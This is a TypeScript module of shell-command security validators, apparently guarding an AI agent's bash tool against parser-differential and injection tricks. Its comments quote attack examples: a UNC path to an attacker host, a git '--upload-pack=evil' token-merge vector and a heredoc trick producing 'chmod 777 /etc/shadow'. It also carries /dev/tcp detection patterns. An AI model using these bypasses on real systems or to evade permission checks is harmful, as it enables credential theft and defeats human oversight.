// Split from bash-security.ts by scripts/split-module.mjs (move-only; verified by scripts/verify-split.mjs).
import { CHECK_IDS, PASS, extractQuotedContent, fail, stripSafeRedirections } from './bash-security-strip-invisible-unicode';
import type { SecurityCheckResult } from './bash-security-strip-invisible-unicode';
import { stripHeredocBodies } from './bash-security-strip-heredoc-bodies';

export function validateCommentQuoteDesync(command: string): SecurityCheckResult {
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];

    if (escaped) { escaped = false; continue; }

    if (inSingleQuote) {
      if (char === "'") inSingleQuote = false;
      continue;
    }

    if (char === '\\') { escaped = true; continue; }

    if (inDoubleQuote) {
      if (char === '"') inDoubleQuote = false;
      continue;
    }

    if (char === "'") { inSingleQuote = true; continue; }
    if (char === '"') { inDoubleQuote = true; continue; }

    if (char === '#') {
      const lineEnd = command.indexOf('\n', i);
      const commentText = command.slice(i + 1, lineEnd === -1 ? command.length : lineEnd);
      if (/['"]/.test(commentText)) {
        return fail(CHECK_IDS.COMMENT_QUOTE_DESYNC, 'Quote characters inside # comment can desync quote tracking');
      }
      if (lineEnd === -1) break;
      i = lineEnd;
    }
  }
  return PASS;
}

export function validateQuotedNewline(command: string): SecurityCheckResult {
  if (/\$'[^']*\\n[^']*'/.test(command)) {
    return fail(CHECK_IDS.QUOTED_NEWLINE, 'ANSI-C quoted newline ($\'...\\n...\') can inject commands');
  }

  if (!command.includes('\n') || !command.includes('#')) return PASS;

  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];

    if (escaped) { escaped = false; continue; }
    if (char === '\\' && !inSingleQuote) { escaped = true; continue; }
    if (char === "'" && !inDoubleQuote) { inSingleQuote = !inSingleQuote; continue; }
    if (char === '"' && !inSingleQuote) { inDoubleQuote = !inDoubleQuote; continue; }

    if (char === '\n' && (inSingleQuote || inDoubleQuote)) {
      const lineStart = i + 1;
      const nextNewline = command.indexOf('\n', lineStart);
      const lineEnd = nextNewline === -1 ? command.length : nextNewline;
      const nextLine = command.slice(lineStart, lineEnd);
      if (nextLine.trim().startsWith('#')) {
        return fail(CHECK_IDS.QUOTED_NEWLINE, 'Quoted newline followed by #-prefixed line can hide arguments from line-based permission checks');
      }
    }
  }
  return PASS;
}

export function validateMidWordHash(command: string): SecurityCheckResult {
  // A `#` with a non-whitespace char immediately before it is a mid-word hash:
  // bash keeps it as a literal word (`echo test# foo` → word `test#`), but the
  // shell-quote parser treats it as a comment start and drops the remainder — a
  // parser-differential that can hide trailing arguments from line-based checks.
  // Only the preceding char must be non-whitespace (catches `test# foo`, not just
  // `a#b`). `${#…}` (array/param length) and `$#` (arg count) are excluded — the
  // `#` there is a parameter-expansion operator, not a word/comment boundary.
  if (/\S(?<!\$)(?<!\$\{)#/.test(command) && !/'[^']*#[^']*'/.test(command) && !/"[^"]*#[^"]*"/.test(command)) {
    return fail(CHECK_IDS.MID_WORD_HASH, 'Mid-word # character may cause unexpected comment behavior in some shells');
  }
  return PASS;
}

export function validateProcessSubstitution(command: string): SecurityCheckResult {
  if (/[<>]\(/.test(command)) return fail(CHECK_IDS.PROCESS_SUBSTITUTION, 'Process substitution (<() or >()) can execute arbitrary commands');
  return PASS;
}

export function validateBacktickInjection(command: string): SecurityCheckResult {
  const cleaned = command.replace(/\\`/g, '');
  if (/`[^`]+`/.test(cleaned)) {
    return fail(CHECK_IDS.BACKTICK_INJECTION, 'Backtick command substitution can execute arbitrary commands; use $() instead');
  }
  return PASS;
}

/**
 * Detect a Windows UNC path (`\\server\share`, `//server/share`, WebDAV and
 * IP/IPv6 variants) in a path or command. A UNC reference makes Windows resolve
 * the host over SMB/WebDAV, which triggers NTLM/Kerberos authentication — an
 * attacker-controlled host can harvest the credential hash or exfiltrate data
 * even from an otherwise "read-only" command (`cat \\attacker.com\x`). Parity
 * with the reference's `containsVulnerableUncPath`
 * (utils/shell/readOnlyCommandValidation.ts:L1562-1638).
 *
 * UNC semantics are Windows-only — on POSIX a `\\host\share` token is just a
 * literal filename with no network side effect — so the check is gated on the
 * platform. `platform` is injectable so the Windows behavior is testable on any
 * host and so the real bash-security entry point can thread the sandbox's host
 * platform through.
 */
export function containsVulnerableUncPath(
  pathOrCommand: string,
  platform: NodeJS.Platform = process.platform,
): boolean {
  if (platform !== 'win32') return false;

  // 1. Backslash UNC: \\server, \\server\share, \\server@port\share. The host
  //    class excludes `@` so the host run and the optional `@port`/`@ssl` marker
  //    are disjoint — matching is linear with no ambiguous overlap.
  // eslint-disable-next-line security/detect-unsafe-regex -- host class [^\s\\/@]+ is disjoint from the following `@…` and `[\\/]|$|\s` arms; linear, run via .test() on bounded command strings
  if (/\\\\[^\s\\/@]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i.test(pathOrCommand)) return true;
  // 2. Forward-slash UNC: //server/share — exclude URL schemes (https://) via the
  //    non-colon lookbehind so `https://x` is not misread as `//x`.
  // eslint-disable-next-line security/detect-unsafe-regex -- host class [^\s\\/@]+ is disjoint from the following `@…` and `[\\/]|$|\s` arms; linear, run via .test() on bounded command strings
  if (/(?<!:)\/\/[^\s\\/@]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i.test(pathOrCommand)) return true;
  // 3. Mixed separators: `/\\server` (bash collapses `/\\` → `/\`, a UNC path).
  if (/\/\\{2,}[^\s\\/]/.test(pathOrCommand)) return true;
  // 4. Mixed separators: `\\/server`.
  if (/\\{2,}\/[^\s\\/]/.test(pathOrCommand)) return true;
  // 5. WebDAV SSL/port markers: \\server@SSL@8443\, \\server@8443@SSL\.
  if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) return true;
  // 6. WebDAV redirector marker.
  if (/DavWWWRoot/i.test(pathOrCommand)) return true;
  // 7. IPv4 UNC host.
  if (/^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
      /^\/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand)) return true;
  // 8. Bracketed IPv6 UNC host.
  if (/^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
      /^\/\/(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand)) return true;

  return false;
}

export function validateUncPath(command: string, platform: NodeJS.Platform): SecurityCheckResult {
  if (containsVulnerableUncPath(command, platform)) {
    return fail(CHECK_IDS.UNC_PATH, 'Command contains a Windows UNC path that could leak credentials or exfiltrate data over SMB/WebDAV');
  }
  return PASS;
}

/**
 * Walk a command with real bash single/double-quote semantics and flag the
 * shell-quote single-quote backslash misparse family. Each time a single-quoted
 * token closes, count the run of backslashes immediately before the closing
 * quote: an ODD count is always a misparse (`'\'`, `'abc\'`), and an EVEN count
 * is a misparse only when a later `'` exists that the shell-quote chunker regex
 * can consume as a false close — the documented HackerOne token-merge vector
 * `git ls-remote 'safe\\' '--upload-pack=evil' 'repo'` (shell-quote merges the
 * tokens into one arg, bash keeps three, hiding `--upload-pack` from arg checks).
 */
export function hasShellQuoteSingleQuoteBug(command: string): boolean {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < command.length; i++) {
    const c = command[i];
    if (inSingle) {
      if (c === "'") {
        let backslashes = 0;
        for (let j = i - 1; j >= 0 && command[j] === '\\'; j--) backslashes++;
        if (backslashes % 2 === 1) return true;
        if (backslashes > 0 && command.indexOf("'", i + 1) !== -1) return true;
        inSingle = false;
      }
      continue;
    }
    if (inDouble) {
      if (c === '\\') { i++; continue; }
      if (c === '"') inDouble = false;
      continue;
    }
    if (c === '\\') { i++; continue; }
    if (c === "'") { inSingle = true; continue; }
    if (c === '"') { inDouble = true; continue; }
  }
  return false;
}

export function validateShellQuoteBug(command: string): SecurityCheckResult {
  if (hasShellQuoteSingleQuoteBug(command)) {
    return fail(CHECK_IDS.SHELL_QUOTE_BUG, 'Blocked: shell-quote single-quote backslash pattern detected (library misparse vector) — to proceed, rewrite the argument so a literal single quote is escaped as \'\\\'\' (close-quote, escaped quote, reopen-quote) or avoid mixing \\ and \' in one token');
  }
  return PASS;
}

export const HEREDOC_IN_SUBSTITUTION = /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+[A-Za-z_]\w*'+|\\[A-Za-z_]\w*)/;

export function stripSafeHeredocSubstitutions(command: string): string | null {
  if (!HEREDOC_IN_SUBSTITUTION.test(command)) return null;

  const heredocPattern = /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g;
  let result = command;
  let found = false;
  let match;
  const ranges: Array<{ start: number; end: number }> = [];

  while ((match = heredocPattern.exec(command)) !== null) {
    if (match.index > 0 && command[match.index - 1] === '\\') continue;
    const delimiter = match[2] || match[3];
    if (!delimiter) continue;
    const isDash = match[1] === '-';
    const operatorEnd = match.index + match[0].length;

    const afterOperator = command.slice(operatorEnd);
    const openLineEnd = afterOperator.indexOf('\n');
    if (openLineEnd === -1) continue;
    if (!/^[ \t]*$/.test(afterOperator.slice(0, openLineEnd))) continue;

    const bodyStart = operatorEnd + openLineEnd + 1;
    const bodyLines = command.slice(bodyStart).split('\n');
    for (let i = 0; i < bodyLines.length; i++) {
      const rawLine = bodyLines[i]!;
      const line = isDash ? rawLine.replace(/^\t*/, '') : rawLine;
      if (line.startsWith(delimiter)) {
        const after = line.slice(delimiter.length);
        let closePos = -1;
        if (/^[ \t]*\)/.test(after)) {
          const lineStart = bodyStart + bodyLines.slice(0, i).join('\n').length + (i > 0 ? 1 : 0);
          closePos = command.indexOf(')', lineStart);
        } else if (after === '') {
          const nextLine = bodyLines[i + 1];
          if (nextLine !== undefined && /^[ \t]*\)/.test(nextLine)) {
            const nextLineStart = bodyStart + bodyLines.slice(0, i + 1).join('\n').length + 1;
            closePos = command.indexOf(')', nextLineStart);
          }
        }
        if (closePos !== -1) {
          ranges.push({ start: match.index, end: closePos + 1 });
          found = true;
        }
        break;
      }
    }
  }

  if (!found) return null;
  for (let i = ranges.length - 1; i >= 0; i--) {
    const r = ranges[i]!;
    result = result.slice(0, r.start) + result.slice(r.end);
  }
  return result;
}

export function validateCommandSubstitution(
  command: string,
  extracted: { fullyUnquoted: string; withDoubleQuotes?: string },
): SecurityCheckResult {
  let content = extracted.fullyUnquoted;
  // `$(...)` command substitution EXECUTES even inside double quotes, so a
  // substitution hidden in a double-quoted string (e.g. `echo "$(evil)"`) is just
  // as live as unquoted — but the fully-unquoted extraction strips double-quoted
  // content, missing it (parity bypass). We additionally scan the
  // double-quote-retaining extraction, but ONLY for `$(` command substitution:
  // `${VAR:-default}` parameter expansion and `$[...]` arithmetic do NOT execute
  // commands and are ubiquitous inside double quotes, so blocking them there would
  // be a false-positive flood.
  let dq = extracted.withDoubleQuotes;

  const stripped = stripSafeHeredocSubstitutions(command);
  if (stripped !== null) {
    // Hardening before trusting the stripped remainder (parity: the reference
    // isSafeHeredoc, bashSecurity.ts L467-513). Two guards, either of which blocks:
    //   1. ARGUMENT-POSITION: a non-whitespace command word must precede the
    //      FIRST heredoc `$(`. If the prefix is empty/whitespace AND there is
    //      trailing text, the `$()` sits in command-NAME position — the heredoc
    //      body becomes the command and the trailing text its args, e.g.
    //      `$(cat <<'EOF'\nchmod\nEOF\n) 777 /etc/shadow` → `chmod 777 /etc/shadow`.
    //   2. SAFE-CHARSET: the remainder may only contain command names, args,
    //      quotes, and whitespace — any shell metacharacter (| & ; $ ` { } < >)
    //      could chain a dangerous command after the safe heredoc. Explicit ASCII
    //      space/tab only (not \s, which matches Unicode whitespace used to hide).
    // (the reference additionally recursively revalidates the remainder; AMI needs no such
    // call. Unlike the reference's early-ALLOW short-circuit, validateCommandSubstitution is
    // one validator among many that ALL run on the full command, so any dangerous
    // remainder — e.g. `zmodload zsh/system $(…)` — is already caught by the main
    // validateZshDangerousCommands pass. A recursive call would be semantic duplication.)
    const trimmedRemaining = stripped.trim();
    if (trimmedRemaining.length > 0) {
      const firstMatch = HEREDOC_IN_SUBSTITUTION.exec(command);
      const prefix = firstMatch ? command.slice(0, firstMatch.index) : '';
      if (prefix.trim().length === 0) {
        return fail(CHECK_IDS.COMMAND_SUBSTITUTION, 'Blocked: $(…heredoc…) substitution in command-name position with trailing arguments (heredoc body would become the command)');
      }
    }
    if (!/^[a-zA-Z0-9 \t"'.\-/_@=,:+~]*$/.test(stripped)) {
      return fail(CHECK_IDS.COMMAND_SUBSTITUTION, 'Blocked: unsafe characters remain after stripping a heredoc substitution (shell metacharacters could chain a dangerous command)');
    }
    const reExtracted = extractQuotedContent(stripped);
    content = reExtracted.fullyUnquoted;
    dq = reExtracted.withDoubleQuotes;
  } else if (command.includes('<<')) {
    // No `$(…heredoc…)` substitution wrapper, but a TOP-LEVEL quoted heredoc
    // (`<<'EOF'` / `<<"EOF"` / `<<\EOF`) has a LITERAL body: bash performs NO
    // command substitution or parameter expansion inside it, so a `$(…)`/`${…}`
    // there is inert text, not a live substitution. Strip ONLY quoted heredoc
    // bodies (unquoted `<<EOF` bodies DO expand and stay visible) and re-extract,
    // so a benign `cat <<'EOF'\n$(whoami)\nEOF` is not a false positive while an
    // unquoted `cat <<EOF\n$(whoami)\nEOF` is still caught.
    const qStripped = stripHeredocBodies(command, { quotedOnly: true });
    if (qStripped !== command) {
      const re = extractQuotedContent(qStripped);
      content = re.fullyUnquoted;
      dq = re.withDoubleQuotes;
    }
  }

  const patterns: [RegExp, string][] = [
    [/\$\(/, '$() command substitution'],
    [/\$\{/, '${} parameter expansion'],
    [/\$\[/, '$[] arithmetic expansion'],
    [/~\[/, '~[] Zsh parameter expansion'],
    [/=\(/, '=() Zsh process substitution'],
    // Word-initial `=cmd` is the Zsh EQUALS expansion: `=curl x` expands to
    // `/usr/bin/curl x`, letting the parser see `=curl` as the base command and
    // bypassing any deny/allow rule keyed on `curl`.
    [/(?:^|[\s;&|])=[a-zA-Z_]/, 'Zsh equals expansion (=cmd)'],
    [/\(e:/, '(e:...:) Zsh glob qualifier eval'],
    [/\(\+/, '(+ Zsh glob qualifier'],
    [/\}\s*always\s*\{/, '} always { Zsh always block'],
    [/<#/, '<# PowerShell comment'],
  ];
  for (const [pat, desc] of patterns) {
    if (pat.test(content)) {
      return fail(CHECK_IDS.COMMAND_SUBSTITUTION, `Blocked: ${desc} detected`);
    }
  }
  // Double-quoted command substitution (execution) — checked separately so only
  // the executing `$(...)` form is caught inside double quotes.
  if (dq !== undefined && dq !== content && /\$\(/.test(dq)) {
    return fail(CHECK_IDS.COMMAND_SUBSTITUTION, 'Blocked: $() command substitution detected');
  }
  return PASS;
}

export function validateRedirections(command: string, extracted: { fullyUnquoted: string }): SecurityCheckResult {
  // Heredoc operators (<<WORD) and their bodies are stdin DATA, not file redirections — strip them
  // first so a heredoc (and any < / > inside its body, e.g. HTML/XML/comparisons) is not mistaken
  // for an unquoted file redirect. A real `> file` on the heredoc's opening line is preserved and
  // still blocked; dangerous body content is still caught by the destructive detectors (ui#26).
  const base = stripHeredocBodies(command);
  const reExtracted = base === command ? extracted : extractQuotedContent(base);
  const content = stripSafeRedirections(reExtracted.fullyUnquoted);
  // Distinct, consequence-explaining messages per direction (parity: the reference
  // validateRedirections) so the model understands WHY it was stopped and how to
  // fix it: input redirection can read sensitive files; output redirection can
  // write to arbitrary files. Input is checked first (matches reference order).
  if (/</.test(content)) {
    return fail(CHECK_IDS.REDIRECTIONS, 'Blocked: input redirection (<) detected which could read sensitive files');
  }
  if (/>/.test(content)) {
    return fail(CHECK_IDS.REDIRECTIONS, 'Blocked: output redirection (>) detected which could write to arbitrary files');
  }
  return PASS;
}

export function validateDevTcpUdpRedirects(command: string): SecurityCheckResult {
  if (/\/dev\/(?:tcp|udp)\//i.test(command)) {
    return fail(CHECK_IDS.DEV_TCP_UDP_REDIRECT, 'Blocked: /dev/tcp or /dev/udp network redirect detected');
  }
  return PASS;
}

/**
 * A redirect target is "dangerous" when it is NOT a simple static path — i.e. it
 * carries a shell expansion the validator cannot resolve but bash will:
 *   - `$VAR` / `$(…)` / `${…}` (parameter / command / arithmetic expansion),
 *   - a backtick command substitution,
 *   - a leading `~` (tilde home / `~user` expansion),
 *   - a filename-glob metachar (`*`, `?`, `[`) or brace expansion (`{…}`).
 * Such a target resolves at execution time to a path static analysis never saw,
 * so `echo x > $DEST`, `> ~/.config/foo`, or `> *.conf` could land on an
 * arbitrary (possibly sensitive) file. Parity: the reference's redirect handling
 * flags a non-static target via hasDangerousExpansion (utils/bash/commands.ts).
 */
export function redirectTargetIsDangerousExpansion(target: string): boolean {
  if (!target) return false;
  if (target.startsWith('~')) return true;
  return /[$`*?[{]/.test(target);
}

export function validateBackslashEscapedWhitespace(command: string, extracted: { fullyUnquoted: string }): SecurityCheckResult {
  const content = extracted.fullyUnquoted;
  if (/\\[ \t]/.test(content)) {
    return fail(CHECK_IDS.BACKSLASH_WHITESPACE, 'Blocked: backslash-escaped whitespace detected (potential path traversal)');
  }
  return PASS;
}
